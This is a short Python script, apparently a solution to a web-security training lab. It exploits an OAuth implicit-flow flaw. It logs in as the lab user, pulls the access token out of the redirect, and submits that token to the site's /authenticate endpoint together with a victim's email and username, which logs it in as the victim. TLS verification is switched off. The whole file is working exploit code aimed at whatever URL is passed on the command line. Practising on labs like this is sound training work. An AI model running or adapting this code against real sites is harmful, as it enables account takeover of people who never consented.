import re
import sys
import requests
from bs4 import BeautifulSoup
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
social_url = burp_url + '/social-login'
auth_url = burp_url + '/authenticate'

session = requests.Session()
session.verify = False

response = session.get(social_url)

soup = BeautifulSoup(response.text, 'html.parser')
meta_tag = soup.find('meta')
oauth_link = meta_tag['content'].split(";")[1][4:]
interaction_url = session.get(oauth_link).url
data = {'username': 'wiener', 'password': 'peter'}
login_response = session.post(f'{interaction_url}/login', data=data)

next_request = session.post(f'{interaction_url}/confirm', allow_redirects=False).next
next_request = session.send(next_request, allow_redirects=False).next
access_token = next_request.url.split('=')[1].split('&')[0]

json_data = {"email": "carlos@carlos-montoya.net", "username": "carlos", "token": access_token}
session.post(auth_url, json=json_data)

account_response = session.get(f'{burp_url}/my-account')

time.sleep(3)
final_response = session.get(burp_url)

